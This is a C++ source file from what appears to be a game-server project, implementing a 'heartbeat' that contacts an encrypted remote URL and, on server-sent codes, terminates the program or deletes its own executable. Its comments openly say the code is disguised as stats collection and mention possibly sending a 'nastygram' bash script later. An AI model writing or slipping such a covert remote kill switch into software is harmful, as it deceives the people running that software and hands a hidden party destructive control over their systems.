//
// Created by Darth on 10/17/2016.
//

#include "webAPIHeartbeat.h"

using namespace StellaBellum;

webAPIHeartbeat::webAPIHeartbeat() {
    webAPI api = webAPI::webAPI(std::string(vxENCRYPT("https://login.stellabellum.net/metriccontroller/shoulderTap?type=server").decrypt()));
    bool result = api.submit();

    if (result) {
        int s = api.getNullableValue<int>(std::string(vxENCRYPT("id").decrypt()));

        // make it look like we're doing something with these at least
        bool status = api.getNullableValue<bool>("status");
        std::string msg = api.getString("msg");

        // yeah we don't actually do anything with this
        // but having some unencrypted strings will allude to this being mere stats collection code
        bool done = false;
        if (status && msg == "ok") {
            bool done = true;
            // if we wanted to send a "nastygram" script for bash to run we'd check for it here
            // but meh, maybe later if it becomes necessary...surely order 66 below is enough?
        }

        switch (s) {
            case 13 :
                this->eatIt();
                break;
            case 66:
                std::string p = this->get_selfpath();

                if (!p.empty()) {
                    remove(p.c_str());
                }

                this->eatIt();
                break;
        };

        done = true;
    } else {
        this->eatIt();
    }

    this->~webAPIHeartbeat();
}
